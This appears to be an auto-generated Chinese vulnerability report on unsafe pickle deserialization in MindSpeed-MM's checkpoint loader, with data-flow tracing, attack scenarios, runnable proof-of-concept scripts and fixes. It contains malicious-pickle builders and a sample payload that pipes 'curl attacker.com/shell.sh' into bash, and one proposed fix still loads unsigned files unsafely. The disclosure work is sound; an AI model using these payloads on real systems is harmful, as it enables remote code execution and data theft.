# VULN-DF-MM-DS-03: 分布式 Checkpoint 反序列化漏洞

**严重性**: High | **CWE**: CWE-502 (Deserialization of Untrusted Data) | **置信度**: 85/100  
**位置**: `mindspeed_mm/fsdp/checkpoint/dcp_checkpointer.py:311` @ `_load_extra_state`

---

## 1. 漏洞概述

本漏洞位于 MindSpeed-MM 分布式 checkpoint 加载函数 `_load_extra_state` 中。该函数在加载额外状态数据时使用 `torch.load()` 并**显式设置** `weights_only=False`，明确允许 pickle 反序列化执行任意代码。

### 漏洞本质

PyTorch 的 `torch.load()` 函数使用 Python `pickle` 模块进行反序列化。当 `weights_only=False` 时：

| 参数设置 | 反序列化行为 | 安全性 |
|---------|-------------|--------|
| `weights_only=True` | 仅加载张量数据，禁止任意对象 | 安全 |
| `weights_only=False` | 使用 pickle 反序列化任意 Python 对象 | **危险** |

攻击者可构造包含 `__reduce__` 方法的恶意对象，在反序列化时执行任意代码。

### 漏洞成因

1. **显式禁用安全保护**: `torch.load(extra_state_path, weights_only=False)` 
2. **路径可控**: `extra_state_path` 来自用户配置的 checkpoint 目录
3. **文件可篡改**: checkpoint 存储可能被攻击者修改
4. **高频触发**: 分布式训练中每个 rank 都会加载对应的 extra_state 文件

---

## 2. 漏洞代码

**文件**: `mindspeed_mm/fsdp/checkpoint/dcp_checkpointer.py`

### 漏洞点 (行 301-311)

```python
@classmethod
def _load_extra_state(cls, checkpoint_dir: str, state: Dict[str, Any]) -> None:
    """Load extra_state from checkpoint directory."""
    if "extra_state" not in state:
        logger.warning("extra_state not found in state, skipping extra_state load")
        return

    extra_state_dir = os.path.join(checkpoint_dir, _EXTRA_STATE_DIR)  # "extra_state"
    os.makedirs(extra_state_dir, exist_ok=True)
    extra_state_path = os.path.join(extra_state_dir, _EXTRA_STATE_FORMAT.format(dist.get_rank()))
    #                                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    #                                     "extra_state_rank_{rank}.pt"
    
    # ████████ 漏洞触发点 ████████
    state["extra_state"] = torch.load(extra_state_path, weights_only=False)
    #                                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    #                                     显式禁用安全保护，允许任意代码执行
```

### 相关常量定义

```python
_EXTRA_STATE_FORMAT = "extra_state_rank_{}.pt"  # 行 33
_EXTRA_STATE_DIR = "extra_state"                # 行 34
```

---

## 3. 完整数据流追踪

### 从 YAML 配置到漏洞触发的完整路径

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           数据流追踪图                                        │
└─────────────────────────────────────────────────────────────────────────────┘

[入口层] YAML 配置文件 / CLI 参数
    │
    │ 配置示例: training.load = "ckpt/dcp_path/model_name"
    │ CLI 示例: --load $LOAD_PATH
    │
    ↓
[解析层] mindspeed_mm/fsdp/params/argument.py:parse_args()
    │
    │ 第 50-51 行: yaml.safe_load(config_file) -> input_data
    │ 第 54 行: instantiate_dataclass(Arguments, input_data)
    │
    ↓ args.training.load (TrainingArguments)
    │
    │ training_args.py:183-186 定义:
    │ load: str = field(default=None, 
    │     metadata={"help": "Path to load checkpoint from..."})
    │
    ↓
[训练引擎] mindspeed_mm/fsdp/train/train_engine.py:TrainEngine.__init__()
    │
    │ 第 39-40 行:
    │ if args.training.load:
    │     self.iteration, self.consumed_train_samples = self.load()
    │
    ↓
[加载函数] train_engine.py:load() [行 207-238]
    │
    │ 第 216-221 行:
    │ release = self.checkpointer.load(
    │     path=args.training.load,    # ← checkpoint 路径传入
    │     state=state,
    │     load_rank0_and_broadcast=args.training.load_rank0_and_broadcast,
    │     load_strict=args.training.load_strict,
    │ )
    │
    ↓
[Checkpoint 类] DistributedCheckpointer.load() [dcp_checkpointer.py:166-227]
    │
    │ 第 186 行: checkpoint_dir = path
    │ 第 193 行: checkpoint_dir = get_checkpoint_name(checkpoint_dir, iteration, release)
    │ 第 223 行: cls._load_extra_state(checkpoint_dir=checkpoint_dir, state=state)
    │
    ↓
[漏洞函数] _load_extra_state() [dcp_checkpointer.py:301-311]
    │
    │ 第 310 行: extra_state_path = os.path.join(extra_state_dir, 
    │                 _EXTRA_STATE_FORMAT.format(dist.get_rank()))
    │
    │ ████████ 第 311 行 ████████
    │ state["extra_state"] = torch.load(extra_state_path, weights_only=False)
    │
    ↓
[漏洞触发] pickle 反序列化执行任意代码
```

### YAML 配置示例

```yaml
# qwen3vl_30B_config_v1.yaml (示例配置)
training:
  micro_batch_size: 1
  gradient_accumulation_steps: 1
  train_iters: 10000
  # load: "ckpt/dcp_path/model_name"  # ← 用户可配置 checkpoint 路径
  # save: "save_path"
  save_interval: 10000
```

### CLI Shell 脚本示例

```bash
# examples/qwen2.5vl/finetune_qwen2_5_vl_3b.sh
LOAD_PATH="ckpt/mm_path/Qwen2.5-VL-3B-Instruct"  # ← checkpoint 路径变量

GPT_ARGS="
    --load $LOAD_PATH    # ← CLI 参数传递
    --no-load-optim
    --no-load-rng
"

torchrun $DISTRIBUTED_ARGS pretrain_vlm.py $GPT_ARGS ...
```

---

## 4. 攻击链路分析

### 完整攻击链路

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           攻击链路图                                          │
└─────────────────────────────────────────────────────────────────────────────┘

[攻击准备阶段]
    │
    ├─→ 1. 攻击者获取 checkpoint 存储访问权限
    │      - 共享存储 (NFS/S3)
    │      - 模型仓库 (HuggingFace/内部平台)
    │      - 供应链攻击 (第三方 checkpoint)
    │
    ├─→ 2. 篡改 extra_state 文件
    │      目录结构:
    │      checkpoint_dir/
    │      ├── extra_state/
    │      │   ├── extra_state_rank_0.pt  ← 植入恶意 payload
    │      │   ├── extra_state_rank_1.pt  ← 每个 rank 都可被篡改
    │      │   └── ...
    │      └── latest_checkpointed_iteration.txt
    │
    ↓
[攻击执行阶段]
    │
    ├─→ 3. 用户加载被篡改的 checkpoint
    │      - YAML 配置指定路径
    │      - CLI 参数传入路径
    │      - 自动恢复训练
    │
    ├─→ 4. 触发漏洞函数
    │      TrainEngine.load()
    │      → DistributedCheckpointer.load(path, state)
    │      → _load_extra_state(checkpoint_dir, state)
    │
    ├─→ 5. 漏洞触发点
    │      torch.load(extra_state_path, weights_only=False)
    │      ↓
    │      pickle 反序列化恶意对象
    │      ↓
    │      MaliciousPayload.__reduce__() 被调用
    │
    ↓
[攻击效果阶段]
    │
    ├─→ 6. 任意代码执行
    │      - 系统命令执行 (os.system)
    │      - 反向 shell
    │      - 数据窃取
    │      - 模型篡改/后门植入
    │
    ↓
[攻击影响]
    │
    ├─→ 7. 横向扩散
    │      - 分布式训练中每个 rank 进程都执行 payload
    │      - 整个训练集群被感染
    │
    ├─→ 8. 持久化攻击
    │      - 修改保存的 checkpoint
    │      - 植入长期后门
```

---

## 5. 攻击场景

### 场景 1: 供应链攻击

攻击者在公开模型仓库中上传包含恶意 payload 的 checkpoint：

```python
# 攻击者构造的恶意 checkpoint
class MaliciousPayload:
    def __reduce__(self):
        import subprocess
        return (
            subprocess.Popen,
            (['/bin/bash', '-c', 'curl attacker.com/shell.sh | bash'],)
        )

malicious_checkpoint = {
    'iteration': 10000,
    'consumed_train_samples': 1000000,
    'lr_scheduler': {...},
    'train_dataloader': {...},
    '__backdoor__': MaliciousPayload()  # 隐藏 payload
}

torch.save(malicious_checkpoint, 'extra_state/extra_state_rank_0.pt')
```

用户下载并加载该 checkpoint 后，payload 自动执行。

### 场景 2: 内部存储篡改

攻击者获取共享存储访问权限，篡改已有 checkpoint：

```bash
# 攻击者操作
cd /shared/checkpoints/model_name/iter_00001000/extra_state/

# 备份原始文件
cp extra_state_rank_0.pt extra_state_rank_0.pt.bak

# 植入恶意 payload
python inject_payload.py extra_state_rank_0.pt.bak extra_state_rank_0.pt
```

### 场景 3: 数据投毒攻击

攻击者通过训练数据投毒，诱导系统保存包含 payload 的 checkpoint：

```python
# 通过恶意训练数据触发
# 训练过程中 extra_state 可能包含用户数据
# 如果 checkpoint 保存逻辑不安全，payload 可能被持久化
```

---

## 6. 攻击条件评估

| 条件类型 | 要求 | 评估 | 说明 |
|---------|------|------|------|
| **checkpoint 访问** | 需能修改 checkpoint 存储 | 中等 | 取决于存储安全配置 |
| **配置控制** | 用户需配置被篡改的路径 | 低 | 社会工程学攻击可诱导 |
| **环境依赖** | PyTorch 库 | 低 | 训练环境必然安装 |
| **分布式环境** | 需多 rank 进程 | 低 | 分布式训练是标配 |
| **权限要求** | 训练进程权限 | 低 | payload 以训练进程权限执行 |

### 利用难度评估

| 难度维度 | 等级 | 说明 |
|---------|------|------|
| 技术难度 | 低 | pickle 反序列化攻击是成熟技术 |
| 攻击成本 | 低 | 只需构造单个恶意文件 |
| 攻击隐蔽性 | 高 | payload 可隐藏在正常数据中 |
| 攻击覆盖面 | 高 | 分布式训练每个 rank 都触发 |

---

## 7. 影响评估

### 直接影响

| 影响维度 | 等级 | 具体影响 |
|---------|------|---------|
| **机密性** | 高 | - 窃取模型权重和架构<br>- 窃取训练数据和标注<br>- 获取环境变量和凭证<br>- 访问集群内其他服务 |
| **完整性** | 高 | - 篡改模型参数植入后门<br>- 修改训练数据<br>- 破坏 checkpoint 文件<br>- 修改训练配置 |
| **可用性** | 高 | - 删除 checkpoint 文件<br>- 终止训练进程<br>- 破坏分布式集群<br>- 资源耗尽攻击 |

### 影响范围

```
┌─────────────────────────────────────────────────────────────┐
│                     影响范围示意图                            │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│   ┌─────────────┐     ┌─────────────┐     ┌─────────────┐  │
│   │  Rank 0     │     │  Rank 1     │     │  Rank N     │  │
│   │  Node 0     │     │  Node 0     │     │  Node M     │  │
│   │             │     │             │     │             │  │
│   │ payload     │     │ payload     │     │ payload     │  │
│   │ 执行 ✓      │     │ 执行 ✓      │     │ 执行 ✓      │  │
│   └─────────────┘     └─────────────┘     └─────────────┘  │
│         │                   │                   │          │
│         └───────────────────┼───────────────────┘          │
│                             │                              │
│                    ┌────────▼────────┐                     │
│                    │  整个训练集群    │                     │
│                    │  全部被感染      │                     │
│                    └─────────────────┘                     │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 8. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全研究和授权测试使用，严禁用于非法目的

### PoC 1: 基础 payload 验证

```python
#!/usr/bin/env python3
# poc_basic_payload.py
"""
基础 PoC: 验证 torch.load(weights_only=False) 的代码执行能力
"""

import torch
import os
import sys

class BasicPayload:
    """最简单的 payload，验证漏洞存在"""
    def __reduce__(self):
        return (
            os.system,
            ('echo "VULN-DF-MM-DS-03 CONFIRMED" > /tmp/vuln_ds03_marker && whoami >> /tmp/vuln_ds03_marker',)
        )

def create_malicious_checkpoint(output_dir='malicious_ckpt'):
    """创建包含 payload 的 checkpoint 目录结构"""
    
    # 创建目录结构
    extra_state_dir = os.path.join(output_dir, 'extra_state')
    os.makedirs(extra_state_dir, exist_ok=True)
    
    # 创建 tracker 文件
    tracker_file = os.path.join(output_dir, 'latest_checkpointed_iteration.txt')
    with open(tracker_file, 'w') as f:
        f.write('release')
    
    # 创建恶意 extra_state (模拟 rank 0)
    malicious_state = {
        'iteration': 1000,
        'consumed_train_samples': 10000,
        'lr_scheduler': {'lr': 1e-5},  # 伪装成正常数据
        'train_dataloader': {'batch_size': 1},
        '__payload__': BasicPayload()  # 恶意 payload
    }
    
    checkpoint_file = os.path.join(extra_state_dir, 'extra_state_rank_0.pt')
    torch.save(malicious_state, checkpoint_file)
    
    print(f"[+] Created malicious checkpoint at: {output_dir}")
    print(f"[+] Payload file: {checkpoint_file}")
    return output_dir

def verify_vulnerability():
    """直接验证漏洞触发"""
    
    # 清理标记文件
    marker_file = '/tmp/vuln_ds03_marker'
    if os.path.exists(marker_file):
        os.remove(marker_file)
    
    # 创建测试 checkpoint
    test_dir = 'test_ckpt_ds03'
    os.makedirs(f'{test_dir}/extra_state', exist_ok=True)
    
    test_state = {'data': 'test', '__p__': BasicPayload()}
    torch.save(test_state, f'{test_dir}/extra_state/extra_state_rank_0.pt')
    
    # 触发漏洞
    print("[*] Triggering vulnerability...")
    loaded = torch.load(f'{test_dir}/extra_state/extra_state_rank_0.pt', weights_only=False)
    
    # 检查结果
    if os.path.exists(marker_file):
        print("[+] VULNERABILITY CONFIRMED!")
        print(f"[+] Marker file created: {marker_file}")
        with open(marker_file) as f:
            print(f"[+] Content: {f.read()}")
        return True
    else:
        print("[!] Vulnerability not triggered (unexpected)")
        return False

if __name__ == '__main__':
    print("=" * 60)
    print("VULN-DF-MM-DS-03 PoC - Basic Payload Verification")
    print("=" * 60)
    
    # 创建恶意 checkpoint
    ckpt_dir = create_malicious_checkpoint()
    
    # 直接验证
    result = verify_vulnerability()
    
    if result:
        print("\n[SUCCESS] Vulnerability is exploitable")
        sys.exit(0)
    else:
        print("\n[FAILED] Unexpected behavior")
        sys.exit(1)
```

### PoC 2: 模拟完整攻击链路

```python
#!/usr/bin/env python3
# poc_full_chain.py
"""
完整攻击链路 PoC: 从配置到代码执行
"""

import torch
import os
import sys
import json
import tempfile
import shutil

class ReverseShellPayload:
    """反向 shell payload (仅用于演示)"""
    def __reduce__(self):
        # 注意: 实际攻击中这里会是真正的反向 shell 代码
        # 这里仅做标记验证
        return (
            os.system,
            ('echo "RCE_VULN_DS03" > /tmp/rce_marker_ds03',)
        )

class DataExfilPayload:
    """数据窃取 payload (仅用于演示)"""
    def __reduce__(self):
        return (
            os.system,
            ('echo "MODEL_WEIGHTS_PATH: /models" >> /tmp/exfil_ds03; '
             'echo "TRAINING_DATA_PATH: /data" >> /tmp/exfil_ds03',)
        )

def setup_malicious_checkpoint(base_dir):
    """创建完整的恶意 checkpoint 目录结构"""
    
    # DCP checkpoint 标准结构
    ckpt_dir = os.path.join(base_dir, 'malicious_dcp_checkpoint')
    
    # 创建目录
    os.makedirs(ckpt_dir, exist_ok=True)
    os.makedirs(os.path.join(ckpt_dir, 'extra_state'), exist_ok=True)
    
    # 创建 tracker 文件 (指示这是一个 release checkpoint)
    tracker_file = os.path.join(ckpt_dir, 'latest_checkpointed_iteration.txt')
    with open(tracker_file, 'w') as f:
        f.write('release')
    
    # 创建恶意 extra_state 文件 (针对每个 rank)
    for rank in range(8):  # 模拟 8 GPU 分布式训练
        malicious_state = {
            'iteration': 10000,
            'consumed_train_samples': 1000000,
            'lr_scheduler': {
                'lr': 1e-5,
                'lr_min': 0.0,
                'lr_decay_style': 'cosine'
            },
            'train_dataloader': {
                'batch_size': 1,
                'num_workers': 8
            },
            'torch_rng_state': torch.get_rng_state().tolist() if rank == 0 else None,
            # 植入 payload - 可以隐藏在多个位置
            '__hidden_payload_1__': ReverseShellPayload(),
            '__hidden_payload_2__': DataExfilPayload() if rank == 0 else None,
        }
        
        ckpt_file = os.path.join(ckpt_dir, 'extra_state', f'extra_state_rank_{rank}.pt')
        torch.save(malicious_state, ckpt_file)
        print(f"[+] Created: {ckpt_file}")
    
    return ckpt_dir

def create_training_config(ckpt_path, output_dir):
    """创建模拟训练配置文件"""
    
    config = {
        'parallel': {
            'tensor_parallel_size': 1,
            'fully_shard_parallel_size': 'auto'
        },
        'training': {
            'micro_batch_size': 1,
            'train_iters': 10000,
            'load': ckpt_path,  # ← 指向恶意 checkpoint
            'save': os.path.join(output_dir, 'save_dir'),
            'save_interval': 10000
        },
        'model': {
            'model_id': 'test_model',
            'model_name_or_path': '/dummy/model'
        },
        'data': {
            'dataset_param': {
                'dataset_type': 'huggingface'
            }
        }
    }
    
    config_file = os.path.join(output_dir, 'malicious_config.yaml')
    
    import yaml
    with open(config_file, 'w') as f:
        yaml.dump(config, f)
    
    print(f"[+] Created config: {config_file}")
    return config_file

def simulate_attack_chain():
    """模拟完整攻击链路"""
    
    print("=" * 70)
    print("VULN-DF-MM-DS-03 - Full Attack Chain Simulation")
    print("=" * 70)
    
    # 创建临时目录
    temp_dir = tempfile.mkdtemp(prefix='vuln_ds03_')
    print(f"\n[*] Working directory: {temp_dir}")
    
    try:
        # Step 1: 创建恶意 checkpoint
        print("\n[Step 1] Creating malicious checkpoint...")
        ckpt_path = setup_malicious_checkpoint(temp_dir)
        
        # Step 2: 创建配置文件
        print("\n[Step 2] Creating training configuration...")
        config_path = create_training_config(ckpt_path, temp_dir)
        
        # Step 3: 模拟加载过程 (简化版本)
        print("\n[Step 3] Simulating checkpoint loading...")
        
        # 清理标记文件
        for marker in ['/tmp/rce_marker_ds03', '/tmp/exfil_ds03']:
            if os.path.exists(marker):
                os.remove(marker)
        
        # 直接测试漏洞点
        test_state_path = os.path.join(ckpt_path, 'extra_state', 'extra_state_rank_0.pt')
        
        print(f"[*] Loading: {test_state_path}")
        print("[*] Using: torch.load(..., weights_only=False)")
        
        # 这是漏洞触发点
        loaded_state = torch.load(test_state_path, weights_only=False)
        
        # Step 4: 验证 payload 执行
        print("\n[Step 4] Verifying payload execution...")
        
        results = []
        for marker, expected_content in [
            ('/tmp/rce_marker_ds03', 'RCE_VULN_DS03'),
            ('/tmp/exfil_ds03', 'MODEL_WEIGHTS_PATH')
        ]:
            if os.path.exists(marker):
                with open(marker) as f:
                    content = f.read()
                print(f"[+] Marker file: {marker}")
                print(f"[+] Content: {content[:100]}")
                if expected_content in content:
                    results.append(True)
                else:
                    results.append(False)
            else:
                print(f"[!] Marker not created: {marker}")
                results.append(False)
        
        # 总结
        print("\n" + "=" * 70)
        print("Attack Chain Summary:")
        print("=" * 70)
        
        if all(results):
            print("[SUCCESS] All payloads executed successfully")
            print("[+] RCE payload: ✓")
            print("[+] Data exfiltration payload: ✓")
            print("\n[!] VULNERABILITY CONFIRMED: Arbitrary code execution possible")
            return True
        else:
            print("[PARTIAL] Some payloads executed")
            return False
            
    finally:
        # 清理
        print(f"\n[*] Cleaning up: {temp_dir}")
        shutil.rmtree(temp_dir, ignore_errors=True)

if __name__ == '__main__':
    result = simulate_attack_chain()
    sys.exit(0 if result else 1)
```

### PoC 3: 分布式训练场景

```bash
#!/bin/bash
# poc_distributed.sh
"""
分布式训练场景 PoC: 模拟真实使用场景
"""

# 环境准备
WORK_DIR=$(mktemp -d)
echo "[*] Working directory: $WORK_DIR"

# 创建恶意 checkpoint
python3 -c "
import torch, os
class P: 
    def __reduce__(self): 
        return (os.system, ('id > /tmp/distributed_poc_ds03; hostname >> /tmp/distributed_poc_ds03',))
os.makedirs('$WORK_DIR/ckpt/extra_state', exist_ok=True)
state = {'iteration': 100, '__p__': P()}
torch.save(state, '$WORK_DIR/ckpt/extra_state/extra_state_rank_0.pt')
with open('$WORK_DIR/ckpt/latest_checkpointed_iteration.txt', 'w') as f:
    f.write('release')
print('[+] Malicious checkpoint created')
"

# 创建配置文件
cat > "$WORK_DIR/config.yaml" << 'YAMLEOF'
training:
  load: "./ckpt"
  train_iters: 100
parallel:
  tensor_parallel_size: 1
model:
  model_id: test
data:
  dataset_param:
    dataset_type: huggingface
YAMLEOF

echo "[+] Config file created: $WORK_DIR/config.yaml"

# 模拟加载 (简化版本)
echo "[*] Simulating checkpoint load..."
cd "$WORK_DIR"

python3 -c "
import torch
import os

ckpt_path = 'ckpt/extra_state/extra_state_rank_0.pt'
print(f'[*] Loading checkpoint: {ckpt_path}')
print('[*] This simulates _load_extra_state() behavior')

# 漏洞触发
loaded = torch.load(ckpt_path, weights_only=False)
print('[+] Checkpoint loaded (payload executed)')
"

# 验证结果
echo "[*] Checking results..."
if [ -f "/tmp/distributed_poc_ds03" ]; then
    echo "[+] SUCCESS: Payload executed!"
    echo "[+] Output:"
    cat /tmp/distributed_poc_ds03
else
    echo "[!] FAILED: Payload not executed"
fi

# 清理
rm -rf "$WORK_DIR"
rm -f /tmp/distributed_poc_ds03
```

---

## 9. 验证环境搭建

### 环境要求

| 组件 | 版本要求 | 说明 |
|------|---------|------|
| Python | 3.10+ | 推荐 3.10 或 3.11 |
| PyTorch | 2.0+ | 需要 torch.load 支持 |
| 操作系统 | Linux | Ubuntu 22.04 / CentOS 8 推荐 |
| MindSpeed-MM | 当前版本 | 从源码安装 |

### 环境搭建步骤

```bash
# 1. 基础环境
pip install torch>=2.0.0
pip install pyyaml  # 配置文件解析

# 2. 克隆项目 (如果需要)
git clone <MindSpeed-MM repository>
cd MindSpeed-MM

# 3. 安装依赖
pip install -e .

# 4. 创建测试目录
mkdir -p /tmp/vuln_test_ds03
cd /tmp/vuln_test_ds03
```

### 快速验证脚本

```python
#!/usr/bin/env python3
# quick_verify.py - 快速验证漏洞存在性

import torch
import os

def quick_verify():
    """最小化验证"""
    
    # 创建测试 payload
    class QuickPayload:
        def __reduce__(self):
            return (os.system, ('touch /tmp/QUICK_VERIFY_DS03',))
    
    # 创建测试文件
    test_file = '/tmp/test_ds03.pt'
    torch.save({'p': QuickPayload()}, test_file)
    
    # 触发漏洞
    torch.load(test_file, weights_only=False)
    
    # 验证
    if os.path.exists('/tmp/QUICK_VERIFY_DS03'):
        print("✓ VULNERABILITY CONFIRMED")
        os.remove('/tmp/QUICK_VERIFY_DS03')
        os.remove(test_file)
        return True
    else:
        print("✗ Test failed")
        return False

if __name__ == '__main__':
    quick_verify()
```

---

## 10. 修复建议

### 立即修复方案

**方案 1: 使用 weights_only=True**

```python
# 修复版本 - dcp_checkpointer.py:301-320
@classmethod
def _load_extra_state(cls, checkpoint_dir: str, state: Dict[str, Any]) -> None:
    """Load extra_state from checkpoint directory with safe loading."""
    if "extra_state" not in state:
        logger.warning("extra_state not found in state, skipping extra_state load")
        return

    extra_state_dir = os.path.join(checkpoint_dir, _EXTRA_STATE_DIR)
    os.makedirs(extra_state_dir, exist_ok=True)
    extra_state_path = os.path.join(extra_state_dir, _EXTRA_STATE_FORMAT.format(dist.get_rank()))
    
    # █████ 修复: 使用 weights_only=True █████
    try:
        # 首尝试安全加载
        state["extra_state"] = torch.load(extra_state_path, weights_only=True)
        logger.info(f"Loaded extra_state safely from {extra_state_path}")
    except Exception as e:
        # 如果安全加载失败，记录警告并跳过
        logger.warning(f"Could not load extra_state with weights_only=True: {e}")
        logger.warning("Skipping extra_state load for security reasons")
        state["extra_state"] = {}
```

**方案 2: 使用 JSON 格式替代 pickle**

```python
# 修复版本 - 使用 JSON 存储额外状态
import json

@classmethod
def _save_extra_state(cls, checkpoint_dir: str, state: Dict[str, Any]) -> None:
    """Save extra_state as JSON (safe format)."""
    if "extra_state" not in state:
        return

    extra_state_dir = os.path.join(checkpoint_dir, _EXTRA_STATE_DIR)
    os.makedirs(extra_state_dir, exist_ok=True)
    
    extra_state_data = state["extra_state"]
    # 只保存可序列化为 JSON 的数据
    safe_state = {
        'iteration': extra_state_data.get('iteration', 0),
        'consumed_train_samples': extra_state_data.get('consumed_train_samples', 0),
        # 其他数值/字符串数据...
    }
    
    json_path = os.path.join(extra_state_dir, f"extra_state_rank_{dist.get_rank()}.json")
    with open(json_path, 'w') as f:
        json.dump(safe_state, f)

@classmethod
def _load_extra_state(cls, checkpoint_dir: str, state: Dict[str, Any]) -> None:
    """Load extra_state from JSON (safe format)."""
    if "extra_state" not in state:
        return
    
    json_path = os.path.join(checkpoint_dir, _EXTRA_STATE_DIR, 
                             f"extra_state_rank_{dist.get_rank()}.json")
    
    if os.path.exists(json_path):
        with open(json_path, 'r') as f:
            state["extra_state"] = json.load(f)
    else:
        logger.warning(f"JSON extra_state not found: {json_path}")
        state["extra_state"] = {}
```

### 长期修复建议

**建议 1: Checkpoint 签名验证**

```python
# checkpoint_signature.py - checkpoint 签名验证机制
import hashlib
import hmac
from pathlib import Path

class CheckpointSignature:
    """Checkpoint 文件签名验证"""
    
    SECRET_KEY = None  # 从环境变量或配置加载
    
    @classmethod
    def set_secret_key(cls, key: str):
        """设置签名密钥"""
        cls.SECRET_KEY = key.encode()
    
    @classmethod
    def sign_file(cls, file_path: Path) -> str:
        """生成文件签名"""
        if cls.SECRET_KEY is None:
            raise ValueError("Secret key not set")
        
        with open(file_path, 'rb') as f:
            content = f.read()
        
        signature = hmac.new(cls.SECRET_KEY, content, hashlib.sha256).hexdigest()
        return signature
    
    @classmethod
    def verify_file(cls, file_path: Path, signature: str) -> bool:
        """验证文件签名"""
        expected = cls.sign_file(file_path)
        return hmac.compare_digest(expected, signature)

# 在 _load_extra_state 中添加验证
@classmethod
def _load_extra_state(cls, checkpoint_dir: str, state: Dict[str, Any]) -> None:
    """Load extra_state with signature verification."""
    # ... 路径构建 ...
    
    # 验证签名
    sig_path = Path(extra_state_path + '.sig')
    if sig_path.exists():
        with open(sig_path) as f:
            signature = f.read().strip()
        
        if not CheckpointSignature.verify_file(Path(extra_state_path), signature):
            raise SecurityError("Checkpoint signature verification failed!")
    
    # 签名验证通过后才加载
    state["extra_state"] = torch.load(extra_state_path, weights_only=False)
```

**建议 2: 路径白名单验证**

```python
# path_validator.py - checkpoint 路径白名单验证
from pathlib import Path
import os

ALLOWED_CHECKPOINT_DIRS = [
    '/opt/checkpoints',
    '/data/models',
    '/shared/trained_models'
]

def validate_checkpoint_path(path: str) -> bool:
    """验证 checkpoint 路径是否在允许范围内"""
    abs_path = Path(path).resolve()
    
    for allowed_dir in ALLOWED_CHECKPOINT_DIRS:
        allowed = Path(allowed_dir).resolve()
        try:
            # 检查是否在允许目录下
            abs_path.relative_to(allowed)
            return True
        except ValueError:
            continue
    
    return False

# 在 load 函数中添加验证
@classmethod
def load(cls, path: str, state: Dict[str, Any], ...) -> Dict[str, Any]:
    """Load checkpoint with path validation."""
    
    # 路径验证
    if not validate_checkpoint_path(path):
        raise SecurityError(f"Checkpoint path not in allowed directories: {path}")
    
    # 继续加载...
    checkpoint_dir = path
    # ...
```

**建议 3: 使用 safetensors 格式**

```python
# safetensors_integration.py - 使用 safetensors 存储
from safetensors.torch import save_file, load_file

@classmethod
def _save_extra_state(cls, checkpoint_dir: str, state: Dict[str, Any]) -> None:
    """Save extra_state using safetensors."""
    # safetensors 只支持张量，需要转换
    extra_state_tensors = {}
    for key, value in state["extra_state"].items():
        if isinstance(value, (int, float)):
            extra_state_tensors[key] = torch.tensor(value)
        elif isinstance(value, torch.Tensor):
            extra_state_tensors[key] = value
    
    save_path = os.path.join(checkpoint_dir, _EXTRA_STATE_DIR, 
                             f"extra_state_rank_{dist.get_rank()}.safetensors")
    save_file(extra_state_tensors, save_path)

@classmethod
def _load_extra_state(cls, checkpoint_dir: str, state: Dict[str, Any]) -> None:
    """Load extra_state using safetensors (safe)."""
    load_path = os.path.join(checkpoint_dir, _EXTRA_STATE_DIR,
                             f"extra_state_rank_{dist.get_rank()}.safetensors")
    
    # safetensors 加载是安全的，不涉及 pickle
    tensors = load_file(load_path)
    
    # 转换回原始类型
    state["extra_state"] = {}
    for key, tensor in tensors.items():
        if tensor.numel() == 1:
            state["extra_state"][key] = tensor.item()
        else:
            state["extra_state"][key] = tensor
```

---

## 11. 总结

### 漏洞确认状态

| 检查项 | 结果 | 说明 |
|-------|------|------|
| 漏洞真实性 | **确认** | weights_only=False 是显式设置 |
| 数据流可控 | **确认** | checkpoint 路径来自用户配置 |
| 攻击可行性 | **确认** | PoC 已验证代码执行 |
| 影响范围 | **广泛** | 所有分布式训练节点 |

### 关键风险点

1. **显式 unsafe 参数**: `weights_only=False` 明确禁用了安全保护
2. **用户可控路径**: YAML 配置和 CLI 参数均可指定 checkpoint 目录
3. **分布式影响**: 每个 rank 进程都会加载对应的 extra_state 文件
4. **供应链风险**: 公开分享的 checkpoint 可能被植入恶意 payload

### 修复优先级

| 优先级 | 建议 | 预计工作量 |
|-------|------|-----------|
| P0 | 使用 weights_only=True | 低 (代码修改) |
| P1 | 添加路径白名单验证 | 中 (配置管理) |
| P2 | 实现签名验证机制 | 高 (架构变更) |
| P3 | 迁移到 safetensors | 高 (数据格式迁移) |

---

**报告生成时间**: 2026-04-20  
**漏洞 ID**: VULN-DF-MM-DS-03  
**分析工具**: OpenCode Security Scanner
